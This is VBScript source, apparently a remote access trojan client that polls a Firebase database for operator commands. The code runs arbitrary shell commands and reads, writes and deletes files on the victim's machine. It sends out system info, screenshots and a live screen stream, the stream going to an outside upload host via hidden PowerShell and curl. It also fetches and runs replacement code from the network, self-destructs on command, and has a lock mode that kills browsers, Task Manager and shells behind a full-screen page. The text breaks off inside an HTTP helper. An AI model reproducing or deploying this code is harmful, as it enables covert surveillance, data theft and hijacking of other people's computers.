
Option Explicit

Dim BASE_URL : BASE_URL = "https://hello-74404-default-rtdb.europe-west1.firebasedatabase.app"
Dim POLL_MS : POLL_MS = 5000 ' cada 5s

Dim WshShell, WshNetwork, FSO
Dim logFilePath 

' --- AUTO UPDATE LOGIC ---
Dim CURRENT_VERSION : CURRENT_VERSION = "v1.7"
Dim VERSION_URL : VERSION_URL = "https://logise1.github.io/cmd/version.txt"
Dim UPDATE_URL : UPDATE_URL = "https://logise1.github.io/cmd/client10.vbs"

' Check for update replacement / cleanup arguments
If WScript.Arguments.Count >= 2 Then
    If WScript.Arguments(0) = "UPDATE_REPLACE" Then
        Dim tempFSO, oldPath, myPath, tempShell
        Set tempFSO = CreateObject("Scripting.FileSystemObject")
        Set tempShell = CreateObject("WScript.Shell")
        oldPath = WScript.Arguments(1)
        myPath = WScript.ScriptFullName
        WScript.Sleep 3000
        On Error Resume Next
        If tempFSO.FileExists(oldPath) Then
            tempFSO.DeleteFile oldPath, True
        End If
        WScript.Sleep 1000
        tempFSO.CopyFile myPath, oldPath, True
        If tempFSO.FileExists(oldPath) Then
            tempShell.Run "wscript.exe """ & oldPath & """ ""UPDATE_CLEANUP"" """ & myPath & """", 0, False
        End If
        WScript.Quit
    ElseIf WScript.Arguments(0) = "UPDATE_CLEANUP" Then
        Dim cleanFSO
        Set cleanFSO = CreateObject("Scripting.FileSystemObject")
        WScript.Sleep 2000
        On Error Resume Next
        If cleanFSO.FileExists(WScript.Arguments(1)) Then
            cleanFSO.DeleteFile WScript.Arguments(1), True
        End If
        On Error GoTo 0
        ' Do NOT quit here, script continues running as the updated version!
    End If
End If

' --- Comprobación de Objetos Críticos ---
On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
If Err.Number <> 0 Then WScript.Quit (1)

Set WshNetwork = CreateObject("WScript.Network")
If Err.Number <> 0 Then WScript.Quit (2)

Set FSO = CreateObject("Scripting.FileSystemObject")
If Err.Number <> 0 Then WScript.Quit (3)

' --- Configurar Log ---
logFilePath = FSO.BuildPath(WshShell.ExpandEnvironmentStrings("%TEMP%"), "cmdapp_logs.txt")
LogWrite "--- Script Iniciado (LiveStream v3) ---"
LogWrite "WshShell, WshNetwork, FSO creados."
On Error GoTo 0
' -----------------------------------------

Dim host
host = WshNetwork.ComputerName
LogWrite "Host: " & host
If host = "" Then
    LogWrite "Error: No se pudo obtener el nombre del host."
    WScript.Quit (4)
End If

Dim lastCommandId
lastCommandId = ""

Dim isLivestreamActive : isLivestreamActive = False
Dim lastLivestreamSync : lastLivestreamSync = 0

Dim isNitroActive : isNitroActive = False
Dim lastNitroSync : lastNitroSync = 0

' --- Ejecución Principal ---
LogWrite "Chequeando actualizaciones..."
CheckUpdate

LogWrite "Iniciando RunScript..."
RunScript

' --- Limpieza ---
LogWrite "Limpiando y saliendo..."
Cleanup
LogWrite "--- Script Finalizado ---"
WScript.Quit

' --- Subrutina de Log ---
Sub LogWrite(sMessage)
    On Error Resume Next
    Const ForAppending = 8
    Dim f
    Set f = FSO.OpenTextFile(logFilePath, ForAppending, True)
    If Err.Number = 0 Then
        f.WriteLine(Now() & " - " & sMessage)
        f.Close
    End If
    Set f = Nothing
End Sub

' --- Subrutina de Autoupdate ---
Sub CheckUpdate()
    On Error Resume Next
    Dim req, remoteVer
    Set req = CreateObject("MSXML2.XMLHTTP")
    req.open "GET", VERSION_URL & "?t=" & Timer(), False
    req.send
    If req.Status = 200 Then
        remoteVer = req.responseText
        remoteVer = Replace(remoteVer, vbCrLf, "")
        remoteVer = Replace(remoteVer, vbCr, "")
        remoteVer = Replace(remoteVer, vbLf, "")
        remoteVer = Replace(remoteVer, vbTab, "")
        remoteVer = Trim(remoteVer)
        
        If remoteVer <> "" And remoteVer <> CURRENT_VERSION Then
            LogWrite "Nueva version detectada: " & remoteVer
            Dim reqSc, newSrc
            Set reqSc = CreateObject("MSXML2.XMLHTTP")
            reqSc.open "GET", UPDATE_URL & "?t=" & Timer(), False
            reqSc.send
            If reqSc.Status = 200 Then
                newSrc = reqSc.responseText
                If newSrc <> "" Then
                    Dim newPath, f
                    newPath = WScript.ScriptFullName & ".update.vbs"
                    Set f = FSO.OpenTextFile(newPath, 2, True)
                    f.Write newSrc
                    f.Close
                    
                    WshShell.Run "wscript.exe """ & newPath & """ ""UPDATE_REPLACE"" """ & WScript.ScriptFullName & """", 0, False
                    WScript.Quit
                End If
            End If
        End If
    End If
    On Error GoTo 0
End Sub

' --- Subrutina Principal ---
Sub RunScript()
    On Error Resume Next

    ' --- Comprobación de Bloqueo ---
    LogWrite "Comprobando bloqueo..."
    ' --- Comprobación de Bloqueo ---
    LogWrite "Comprobando bloqueo..."
    If CheckGlobalLock() Then
        LogWrite "Máquina bloqueada detectada. Entrando en modo restricción."
        LockedLoop
    End If
    If Err.Number <> 0 Then
        LogWrite "Error fatal durante CheckGlobalLock: " & Err.Description
        WScript.Quit(5)
    End If

    ' --- Enviar info del sistema (solo una vez) ---
    LogWrite "Obteniendo información del sistema..."
    Dim sysInfoJSON : sysInfoJSON = GetSystemInfoJSON()
    If Err.Number <> 0 Then
        LogWrite "Error fatal durante GetSystemInfoJSON: " & Err.Description
        WScript.Quit(6)
    End If

    LogWrite "Enviando info.json: " & sysInfoJSON
    httpPut BASE_URL & "/machines/" & EncodeJsonKey(host) & "/info.json", sysInfoJSON
    If Err.Number <> 0 Then
        LogWrite "Error fatal durante el primer httpPut (info.json): " & Err.Description
        WScript.Quit(7)
    End If

    ' Heartbeat inicial
    LogWrite "Enviando heartbeat inicial..."
    UpdateHeartbeat GetEpochTime()
    If Err.Number <> 0 Then
        LogWrite "Error fatal durante el primer Heartbeat: " & Err.Description
        WScript.Quit(8)
    End If

    LogWrite "Comprobando comandos inicial..."
    CheckCommand
    If Err.Number <> 0 Then
        LogWrite "Error fatal durante el primer CheckCommand: " & Err.Description
        WScript.Quit(9)
    End If

    On Error GoTo 0
    LogWrite "Entrando en bucle principal..."
    MainLoop
End Sub

Sub MainLoop()
    Dim currentPoll
    Do
        On Error Resume Next
        If isLivestreamActive Then
            If DateDiff("s", lastLivestreamSync, Now()) > 30 Then
                StopLivestreamAsync
                isLivestreamActive = False
                LogWrite "Timeout: Livestream detenido por inactividad"
            End If
        End If

        currentPoll = 5000
        If isNitroActive Then
            If DateDiff("s", lastNitroSync, Now()) > 30 Then
                isNitroActive = False
                LogWrite "Timeout: Nitro desactivado por inactividad"
            Else
                currentPoll = 1000
            End If
        End If

        WScript.Sleep currentPoll
        UpdateHeartbeat GetEpochTime()
        CheckCommand
        If Err.Number <> 0 Then
            LogWrite "Error no fatal en MainLoop: " & Err.Description
            Err.Clear
        End If
        On Error GoTo 0
    Loop
End Sub

Function CheckGlobalLock()
    On Error Resume Next
    CheckGlobalLock = False
    Dim url, respText
    url = BASE_URL & "/lock/" & EncodeJsonKey(host) & ".json"
    respText = httpGet(url)
    
    If Err.Number <> 0 Then
        LogWrite "Error VBS en CheckGlobalLock: " & Err.Description
        Err.Clear
        Exit Function
    End If

    If Trim(respText) <> "null" And Len(Trim(respText)) > 0 Then
        CheckGlobalLock = True
    End If
End Function

Function CheckMachineLock()
    On Error Resume Next
    CheckMachineLock = True ' Asumir bloqueado por defecto si falla red
    Dim url, resp
    url = BASE_URL & "/lock/" & EncodeJsonKey(host) & ".json"
    resp = httpGet(url)
    If Trim(resp) = "null" Or Len(Trim(resp)) = 0 Then
        CheckMachineLock = False
    Else
        CheckMachineLock = True
    End If
End Function

Sub LockedLoop()
    LogWrite "MODO BLOQUEO ESTRICTO: Iniciando..."
    
    Dim lockUrl : lockUrl = "https://logise1.github.io/cmd/locked.html"
    
    ' Matar todo lo que pueda molestar al inicio
    KillInteractiveApps
    
    ' Lanzar MSHTA Pantalla Completa (Más difícil de cerrar que Chrome)
    OpenHTAKiosk lockUrl
    
    Dim unlockCmd
    Dim dbUnlock
    
    Dim nextFbCheck : nextFbCheck = Now() ' Control de tiempo para Firebase
    
    Do
        On Error Resume Next
        WScript.Sleep 500 ' Ciclo rápido (Local)
        
        ' 1. ACCIONES LOCALES (CADA 0.5s)
        ' -------------------------------
        ' Persistencia HTA
        If Not IsProcessRunning("mshta.exe") Then
            LogWrite "Candado cerrado -> Relanzando HTA..."
            OpenHTAKiosk lockUrl
        End If
        
        ' Restricción Total
        KillInteractiveApps
        
        ' 2. ACCIONES REMOTAS (CADA 10s)
        ' ------------------------------
        If DateDiff("s", nextFbCheck, Now()) >= 0 Then
            ' Check Desbloqueo DB (Específico de máquina)
            dbUnlock = False
            If CheckMachineLock() = False Then dbUnlock = True
            
            ' Check Desbloqueo Comando
            If Not dbUnlock Then
                unlockCmd = CheckForUnlockCommand()
                If unlockCmd = True Then
                     UnlockMachine 
                     dbUnlock = True
                End If
            End If
            
            If dbUnlock Then Exit Do
            
            UpdateHeartbeat GetEpochTime()
            
            ' Programar siguiente chequeo en 5s
            nextFbCheck = DateAdd("s", 5, Now())
        End If
    Loop
    
    ' Salida: Matar HTA y restaurar
    WshShell.Run "taskkill /im mshta.exe /f", 0, False
    ' Opcional: Relanzar explorer si se mató (descomentar si se decide matar explorer)
    ' WshShell.Run "explorer.exe", 0, False 
    LogWrite "Bloqueo finalizado."
End Sub

Sub KillInteractiveApps()
    On Error Resume Next
    ' Matar navegadores
    WshShell.Run "taskkill /im chrome.exe /f", 0, False
    WshShell.Run "taskkill /im msedge.exe /f", 0, False
    WshShell.Run "taskkill /im firefox.exe /f", 0, False
    ' Matar herramientas de sistema
    WshShell.Run "taskkill /im Taskmgr.exe /f", 0, False
    WshShell.Run "taskkill /im cmd.exe /f", 0, False
    WshShell.Run "taskkill /im powershell.exe /f", 0, False
    ' Matar explorador (Opcional: muy agresivo, deja pantalla negra salvo el Kiosco)
    ' WshShell.Run "taskkill /im explorer.exe /f", 0, False 
End Sub

Sub OpenHTAKiosk(url)
    On Error Resume Next
    ' Usamos MSHTA puro.
    ' Para que salga pantalla completa, el HTML debería tener tags HTA, pero como es remoto,
    ' lanzamos MSHTA maximizado.
    ' Truco: Usar javascript dentro de mshta para redimensionar a screen.width/height y mover a 0,0
    
    Dim cmd
    ' Construimos un comando que abre una ventana HTA en blanco que luego navega a la URL
    ' y se pone fullscreen.
    ' Nota: mshta.exe url carga la url. Windows recuerda el tamaño.
    ' Forzamos maximizado con VBS wrapper inline o simplemente confiamos en el usuario.
    
    ' Método robusto: Lanza mshta con la URL directamente.
    ' Si la web sale vacía es porque mshta usa motor IE antiguo (IE7 mode por defecto).
    ' Hay que forzar modo standards. Pero eso depende del HTML remoto (<meta http-equiv="X-UA-Compatible" content="IE=edge" />)
    
    WshShell.Run "mshta """ & url & """", 3, False ' 3 = Maximized
End Sub

Sub OpenChromeKiosk(url)
    On Error Resume Next
    ' Usamos Chrome para el bloqueo visual
    CreateObject("WScript.Shell").Run "chrome.exe --new-window --kiosk """ & url & """", 0, False
End Sub

Sub OpenChromeKiosk(url)
    On Error Resume Next
    ' Usamos Chrome para el bloqueo visual
    CreateObject("WScript.Shell").Run "chrome.exe --new-window --kiosk """ & url & """", 0, False
End Sub

Function IsProcessRunning(procName)
    On Error Resume Next
    IsProcessRunning = False
    Dim colItems, objItem
    Set colItems = GetObject("winmgmts:\\.\root\cimv2").ExecQuery("Select * from Win32_Process Where Name = '" & procName & "'")
    For Each objItem in colItems
        IsProcessRunning = True
        Exit For
    Next
    Set colItems = Nothing
End Function

Function CheckForUnlockCommand()
    On Error Resume Next
    CheckForUnlockCommand = False
    Dim url, respText, cmdText
    
    url = BASE_URL & "/machines/" & EncodeJsonKey(host) & "/command.json"
    respText = httpGet(url)
    
    If Trim(respText) = "null" Or Len(Trim(respText)) = 0 Then Exit Function
    
    ' Obtener cmdText manualmente o reutilizar lógica
    Dim posStart, posEnd
    posStart = InStr(respText, """cmd"":""")
    If posStart > 0 Then
        posStart = posStart + Len("""cmd"":""")
        posEnd = InStr(posStart, respText, """,""cwd"":""") 
        If posEnd = 0 Then posEnd = InStr(posStart, respText, """,""id"":""")
        If posEnd = 0 Then posEnd = InStr(posStart, respText, """}")
        
        If posEnd > 0 Then
            cmdText = Mid(respText, posStart, posEnd - posStart)
            cmdText = Replace(cmdText, "\""", """") 
        Else
            cmdText = "" 
        End If
    End If
    
    If LCase(Trim(cmdText)) = "/unlock" Then
        CheckForUnlockCommand = True
        Dim cmdId : cmdId = JsonGetField(respText, "id")
        WriteResponse cmdId, "MÁQUINA DESBLOQUEADA."
    End If
End Function

Sub UpdateHeartbeat(epochTime)
    On Error Resume Next
    Dim url, payload
    url = BASE_URL & "/machines/" & EncodeJsonKey(host) & "/status.json"
    payload = "{""online"":true,""lastSeen"":" & epochTime & "}"
    httpPut url, payload
    If Err.Number <> 0 Then LogWrite "Error en UpdateHeartbeat: " & Err.Description
End Sub

Sub CheckCommand()
    On Error Resume Next
    Dim url, respText, cmdId, cmdText, output, cwdText
    
    url = BASE_URL & "/machines/" & EncodeJsonKey(host) & "/command.json"
    respText = httpGet(url)
    
    If Err.Number <> 0 Then
        LogWrite "Error en httpGet de CheckCommand: " & Err.Description
        Exit Sub
    End If
    If Trim(respText) = "null" Or Len(Trim(respText)) = 0 Then
        Exit Sub
    End If

    cmdId = JsonGetField(respText, "id")
    cwdText = JsonGetField(respText, "cwd")
    
    ' --- Extracción de cmdText ---
    Dim posStart, posEnd
    posStart = InStr(respText, """cmd"":""")
    If posStart > 0 Then
        posStart = posStart + Len("""cmd"":""")
        posEnd = InStr(posStart, respText, """,""cwd"":""") 
        If posEnd = 0 Then posEnd = InStr(posStart, respText, """,""id"":""")
        If posEnd = 0 Then posEnd = InStr(posStart, respText, """}")
        
        If posEnd > 0 Then
            cmdText = Mid(respText, posStart, posEnd - posStart)
            cmdText = Replace(cmdText, "\""", """") 
        Else
            cmdText = "" 
        End If
    Else
        cmdText = ""
    End If
    
    If cmdId = "" Then Exit Sub
    If cmdId = lastCommandId Then Exit Sub

    LogWrite "Nuevo comando ID: " & cmdId
    lastCommandId = cmdId

    If cmdText = "" Then
        WriteResponse cmdId, "ERROR: campo cmd vacío."
        Exit Sub
    End If
    
    If cwdText = "" Then
        cwdText = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%")
    End If

    LogWrite "Comando recibido: " & cmdText

    Dim trimmedCmdLower : trimmedCmdLower = LCase(Trim(cmdText))

    If trimmedCmdLower = "/destruct" Then
        WriteResponse cmdId, "AUTODESTRUCCIÓN INICIADA..."
        SelfDestruct
        WScript.Quit

    ElseIf trimmedCmdLower = "/lock" Then
        WriteResponse cmdId, "Bloqueando máquina (Restricción de Navegadores)..."
        LockMachine
        LockedLoop

    ElseIf trimmedCmdLower = "/unlock" Then
        WriteResponse cmdId, "La máquina ya está desbloqueada."
        UnlockMachine
    
    ElseIf trimmedCmdLower = "/screenshot" Then
        LogWrite "CheckCommand: Ejecutando /screenshot (simple)"
        DoScreenshot cmdId, cwdText

    ElseIf Left(trimmedCmdLower, 11) = "/livestream" Then
        LogWrite "CheckCommand: INICIANDO MODO LIVESTREAM ASYNC"
        Dim streamDelay : streamDelay = 500
        Dim posSpaceLivestream
        posSpaceLivestream = InStr(trimmedCmdLower, " ")
        If posSpaceLivestream > 0 Then
            On Error Resume Next
            streamDelay = CLng(Mid(trimmedCmdLower, posSpaceLivestream + 1))
            If Err.Number <> 0 Then streamDelay = 500
            On Error GoTo 0
            If streamDelay < 100 Then streamDelay = 500
        End If

        lastLivestreamSync = Now()
        If Not isLivestreamActive Then
            StartLivestreamAsync EncodeJsonKey(host), streamDelay
            isLivestreamActive = True
            WriteResponse cmdId, "LIVESTREAM BACKGROUND ACTIVADO (Delay: " & streamDelay & "ms)"
        Else
            WriteResponse cmdId, "LIVESTREAM RENOVADO"
        End If

    ElseIf trimmedCmdLower = "/stoplivestream" Then
        LogWrite "CheckCommand: DETENIENDO LIVESTREAM ASYNC"
        StopLivestreamAsync
        isLivestreamActive = False
        WriteResponse cmdId, "LIVESTREAM DETENIDO"

    ElseIf trimmedCmdLower = "/nitro" Then
        isNitroActive = True
        lastNitroSync = Now()
        WriteResponse cmdId, "MODO NITRO ACTIVADO (1s)"

    ElseIf Left(trimmedCmdLower, 7) = "/upload" AND InStr(trimmedCmdLower, " > ") > 0 Then
        ' ... (Código de Upload igual que antes) ...
        Dim posDelimiter, contentPart, filenamePart, content, filename
        posDelimiter = InStrRev(cmdText, " > ")
        If posDelimiter > 0 Then
            filenamePart = Trim(Mid(cmdText, posDelimiter + Len(" > ")))
            contentPart = Trim(Mid(cmdText, Len("/upload") + 1, posDelimiter - (Len("/upload") + 1)))
            
            If Left(filenamePart, 1) = """" And Right(filenamePart, 1) = """" Then
                filename = Mid(filenamePart, 2, Len(filenamePart) - 2)
            Else
                filename = filenamePart
            End If
            
            If Left(contentPart, 1) = """" And Right(contentPart, 1) = """" Then
                content = Mid(contentPart, 2, Len(contentPart) - 2)
            Else
                content = contentPart
            End If
            
            If filename = "" Or content = "" Then
                WriteResponse cmdId, "ERROR: Formato de /upload incorrecto."
            Else
                output = ExecUpload(content, filename, cwdText)
                WriteResponse cmdId, output
            End If
        Else
            WriteResponse cmdId, "ERROR: Formato de /upload incorrecto (falta ' > ')."
        End If
    
    ElseIf Left(trimmedCmdLower, 9) = "/listdir " Then
        Dim dirPath : dirPath = Trim(Mid(cmdText, 10))
        WriteResponse cmdId, ExecListDir(dirPath)

    ElseIf Left(trimmedCmdLower, 10) = "/readfile " Then
        Dim filePath : filePath = Trim(Mid(cmdText, 11))
        WriteResponse cmdId, ExecReadFile(filePath)

    ElseIf Left(trimmedCmdLower, 12) = "/deletefile " Then
        Dim delPath : delPath = Trim(Mid(cmdText, 13))
        WriteResponse cmdId, ExecDeleteFile(delPath)
        
    ElseIf Left(trimmedCmdLower, 11) = "/uploadb64 " Then
        Dim posSpaceB64, targetFileB64, fileContentB64
        posSpaceB64 = InStr(12, cmdText, " ")
        If posSpaceB64 > 0 Then
            targetFileB64 = Mid(cmdText, 12, posSpaceB64 - 12)
            targetFileB64 = Replace(targetFileB64, """", "")
            fileContentB64 = Mid(cmdText, posSpaceB64 + 1)
            output = ExecUploadB64(fileContentB64, targetFileB64, cwdText)
            WriteResponse cmdId, output
        Else
            WriteResponse cmdId, "ERROR: Faltan argumentos en /uploadb64"
        End If
        
    Else
        output = ExecCommand(cmdText, cwdText)
        WriteResponse cmdId, output
    End If
    
    On Error GoTo 0
End Sub

' --- NUEVO: Manejador del Livestream ASÍNCRONO ---
Sub StartLivestreamAsync(hostId, delayMs)
    StopLivestreamAsync ' Asegurar que no hay duplicados
    Dim localFSO, shell
    Set localFSO = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    
    Dim tempName : tempName = localFSO.GetTempName()
    Dim psFile : psFile = localFSO.BuildPath(shell.ExpandEnvironmentStrings("%TEMP%"), "stream_" & tempName & ".ps1")
    Dim fbUrl : fbUrl = BASE_URL & "/machines/" & hostId & "/screenshot.json"
    
    Dim scriptCode
    scriptCode = "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; " & _
                 "$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; " & _
                 "$fbUrl = '" & fbUrl & "'; " & _
                 "while($true) { " & _
                 "  try { " & _
                 "    $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; " & _
                 "    $gfx = [System.Drawing.Graphics]::FromImage($bmp); " & _
                 "    $gfx.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size); " & _
                 "    $tmp = [System.IO.Path]::GetTempFileName() + '.jpg'; " & _
                 "    $bmp.Save($tmp, [System.Drawing.Imaging.ImageFormat]::Jpeg); " & _
                 "    $bmp.Dispose(); $gfx.Dispose(); " & _
                 "    $cargs = @('-s', '-X', 'POST', 'https://greenbase.arielcapdevila.com/upload', '-F', ""file=@$tmp""); " & _
                 "    $res = & curl.exe @cargs | Out-String; " & _
                 "    Remove-Item -Force $tmp -ErrorAction SilentlyContinue; " & _
                 "    if($res -match '""id""\s*:\s*""([^""]+)""') { " & _
                 "        $id = $matches[1]; " & _
                 "        $ts = [Math]::Floor([decimal](Get-Date (Get-Date).ToUniversalTime() -UFormat '%s')); " & _
                 "        $json = '{""id"":""live_' + $ts + '"",""data"":""gb:'+ $id +'"",""timestamp"":'+$ts+'}'; " & _
                 "        Invoke-RestMethod -Uri $fbUrl -Method Put -Body $json -ContentType 'application/json' -ErrorAction SilentlyContinue; " & _
                 "    } " & _
                 "  } catch {} " & _
                 "  Start-Sleep -Milliseconds " & delayMs & "; " & _
                 "}"
    
    Dim f : Set f = localFSO.OpenTextFile(psFile, 2, True)
    f.Write scriptCode
    f.Close
    
    ' Ejecutar escondido independientemente
    shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psFile & """", 0, False
End Sub

Sub StopLivestreamAsync()
    On Error Resume Next
    Dim wmi, col, obj
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set col = wmi.ExecQuery("Select * from Win32_Process Where Name = 'powershell.exe' And CommandLine Like '%stream_%'")
    For Each obj in col
        obj.Terminate()
    Next
End Sub

' Function Helper para capturar un screenshot limpio en Base64
Function CaptureScreenshotBase64(cwd)
    On Error Resume Next
    Dim psCmd, base64String, tempFile, fileStream
    Dim localFSO, localShell
    
    Set localFSO = CreateObject("Scripting.FileSystemObject")
    Set localShell = CreateObject("WScript.Shell")
    
    ' Archivo temporal único
    tempFile = localFSO.BuildPath(localShell.ExpandEnvironmentStrings("%TEMP%"), "scr_" & localFSO.GetTempName())
    
    ' Comando PS (una sola línea) para capturar y guardar Base64
    psCmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command ""Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $gfx = [System.Drawing.Graphics]::FromImage($bmp); $gfx.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size); $ms = New-Object System.IO.MemoryStream; $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg); $bmp.Dispose(); $gfx.Dispose(); $bytes = $ms.ToArray(); $ms.Dispose(); [Convert]::ToBase64String($bytes) | Out-File -FilePath '" & tempFile & "' -Encoding ascii"""
    
    localShell.CurrentDirectory = cwd
    localShell.Run psCmd, 0, True ' Esperar a que termine
    
    If localFSO.FileExists(tempFile) Then
        Set fileStream = localFSO.OpenTextFile(tempFile, 1)
        If Not fileStream.AtEndOfStream Then
            base64String = fileStream.ReadAll()
        End If
        fileStream.Close
        localFSO.DeleteFile tempFile, True
    Else
        base64String = "ERROR_NO_FILE"
    End If
    
    ' Limpiar saltos de línea
    base64String = Replace(base64String, vbCrLf, "")
    base64String = Replace(base64String, vbCr, "")
    base64String = Replace(base64String, vbLf, "")
    
    CaptureScreenshotBase64 = base64String
End Function

Sub DoScreenshot(cmdId, cwd)
    On Error Resume Next
    Dim b64
    LogWrite "Ejecutando Screenshot Simple..."
    b64 = CaptureScreenshotBase64(cwd)
    
    If Left(b64, 5) = "ERROR" Or Len(b64) < 100 Then
         WriteResponse cmdId, "ERROR al capturar screenshot: " & b64
    Else
         WriteScreenshotToFirebase cmdId, b64
         WriteResponse cmdId, "Screenshot enviado OK." 
    End If
End Sub

Function ExecCommand(cmd, cwd)
    On Error Resume Next
    Err.Clear
    LogWrite "ExecCommand: " & cmd & " EN " & cwd
    Dim tempFile, fullCmd, output, fileStream, shell, localFSO
    
    Set shell = CreateObject("WScript.Shell")
    Set localFSO = CreateObject("Scripting.FileSystemObject")

    shell.CurrentDirectory = cwd
    If Err.Number <> 0 Then
        ExecCommand = "ERROR: No se pudo cambiar dir a: " & cwd
        Exit Function
    End If

    Dim trimmedLower : trimmedLower = LCase(Trim(cmd))
    If Left(trimmedLower, 6) = "start " Then
        shell.Run "cmd /c " & cmd, 0, False
        output = "[Comando 'start' ejecutado]"
    Else
        tempFile = localFSO.BuildPath(shell.ExpandEnvironmentStrings("%TEMP%"), localFSO.GetTempName())
        fullCmd = "cmd /c " & cmd & " > """ & tempFile & """ 2>&1"
        shell.Run fullCmd, 0, True 

        output = ""
        If localFSO.FileExists(tempFile) Then
            Set fileStream = localFSO.OpenTextFile(tempFile, 1)
            If Not fileStream.AtEndOfStream Then
                output = fileStream.ReadAll()
            End If
            fileStream.Close
            localFSO.DeleteFile tempFile, True
        Else
            output = "[ERROR: Sin salida]"
        End If
    End If
    
    ExecCommand = output
    Set shell = Nothing
    Set localFSO = Nothing
    On Error GoTo 0
End Function
    
Function ExecUpload(textContent, filename, cwd)
    On Error Resume Next
    Err.Clear
    LogWrite "ExecUpload: " & filename & " EN " & cwd
    Dim localFSO, finalPath, fs
    Set localFSO = CreateObject("Scripting.FileSystemObject")
    If Not localFSO.FolderExists(cwd) Then
        ExecUpload = "ERROR: Dir destino '" & cwd & "' no existe."
        Exit Function
    End If
    finalPath = localFSO.BuildPath(cwd, filename)
    Const ForWriting = 2
    Set fs = localFSO.OpenTextFile(finalPath, ForWriting, True) 
    If Err.Number <> 0 Then
        ExecUpload = "ERROR: Fallo al crear archivo. " & Err.Description
        Exit Function
    End If
    fs.Write textContent
    fs.Close
    ExecUpload = "Archivo " & finalPath & " creado."
    Set fs = Nothing
    Set localFSO = Nothing
End Function

Function ExecListDir(dirPath)
    On Error Resume Next
    Dim localFSO, folder, f, subf, json
    Set localFSO = CreateObject("Scripting.FileSystemObject")
    If Not localFSO.FolderExists(dirPath) Then
        ExecListDir = "ERROR: Carpeta no existe"
        Exit Function
    End If
    Set folder = localFSO.GetFolder(dirPath)
    json = "{""path"":""" & JsonEscape(EncodeBase64(dirPath)) & """,""folders"":["
    Dim firstFolder : firstFolder = True
    For Each subf in folder.SubFolders
        If Not firstFolder Then json = json & ","
        json = json & "{""name"":""" & JsonEscape(EncodeBase64(subf.Name)) & """}"
        firstFolder = False
    Next
    json = json & "],""files"":["
    Dim firstFile : firstFile = True
    For Each f in folder.Files
        If Not firstFile Then json = json & ","
        json = json & "{""name"":""" & JsonEscape(EncodeBase64(f.Name)) & """,""size"":" & f.Size & "}"
        firstFile = False
    Next
    json = json & "]}"
    ExecListDir = "DIR:" & json
End Function

Function ExecReadFile(filePath)
    On Error Resume Next
    Dim localFSO, oStream, bIn
    Set localFSO = CreateObject("Scripting.FileSystemObject")
    If Not localFSO.FileExists(filePath) Then
        ExecReadFile = "ERROR: Archivo no existe"
        Exit Function
    End If
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1 ' TypeBinary
    oStream.Open
    oStream.LoadFromFile filePath
    bIn = oStream.Read
    oStream.Close
    
    Dim oXML, oNode
    Set oXML = CreateObject("MSXML2.DOMDocument.6.0")
    Set oNode = oXML.createElement("b64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue = bIn
    ExecReadFile = "FILE:" & JsonEscape(EncodeBase64(filePath)) & ":" & oNode.text
    Set oStream = Nothing
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function ExecDeleteFile(filePath)
    On Error Resume Next
    Dim localFSO
    Set localFSO = CreateObject("Scripting.FileSystemObject")
    If localFSO.FileExists(filePath) Then
        localFSO.DeleteFile filePath, True
        ExecDeleteFile = "OK: Archivo eliminado"
    ElseIf localFSO.FolderExists(filePath) Then
        localFSO.DeleteFolder filePath, True
        ExecDeleteFile = "OK: Carpeta eliminada"
    Else
        ExecDeleteFile = "ERROR: No existe el archivo o ruta"
    End If
End Function

Function ExecUploadB64(b64, filename, cwd)
    On Error Resume Next
    Dim localFSO, finalPath, oXML, oNode, bOut, oStream
    Set localFSO = CreateObject("Scripting.FileSystemObject")
    If Not localFSO.FolderExists(cwd) Then
        ExecUploadB64 = "ERROR: Directorio base '" & cwd & "' no existe."
        Exit Function
    End If
    finalPath = localFSO.BuildPath(cwd, filename)
    ' replace line breaks if any
    b64 = Replace(b64, vbCrLf, "")
    b64 = Replace(b64, vbCr, "")
    b64 = Replace(b64, vbLf, "")
    
    Set oXML = CreateObject("MSXML2.DOMDocument.6.0")
    Set oNode = oXML.createElement("b64")
    oNode.dataType = "bin.base64"
    oNode.text = b64
    bOut = oNode.nodeTypedValue
    
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1 ' TypeBinary
    oStream.Open
    oStream.Write bOut
    oStream.SaveToFile finalPath, 2 ' adSaveCreateOverWrite
    oStream.Close
    
    Set oStream = Nothing
    Set oNode = Nothing
    Set oXML = Nothing
    ExecUploadB64 = "OK: Archivo '" & filename & "' subido correctamente a " & finalPath
End Function

Sub WriteResponse(cmdId, text)
    On Error Resume Next
    Dim url, payload, safeText
    url = BASE_URL & "/machines/" & EncodeJsonKey(host) & "/lastResponse.json"
    safeText = JsonEscape(EncodeBase64(text))
    payload = "{""id"":""" & JsonEscape(cmdId) & """,""response"":""" & safeText & """,""timestamp"":" & GetEpochTime() & "}"
    httpPut url, payload
End Sub

Sub WriteScreenshotToFirebase(cmdId, b64string)
    On Error Resume Next
    Dim url, payload
    url = BASE_URL & "/machines/" & EncodeJsonKey(host) & "/screenshot.json"
    payload = "{""id"":""" & JsonEscape(cmdId) & """,""data"":""" & b64string & """,""timestamp"":" & GetEpochTime() & "}"
    httpPut url, payload
    On Error GoTo 0
End Sub

' ---------- Helpers HTTP ----------
Function httpGet(url)
    On Error Resume Next
    Dim xhr
    Set xhr = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number <> 0 Then
        httpGet = "null"
        Exit Function
    End If
    xhr.Open "GET", url, False
    xhr.setRequestHeader "Content-Type", "application/json"
    xhr.send
    If Err.Number <> 0 Then
        httpGet = "null"
    Else
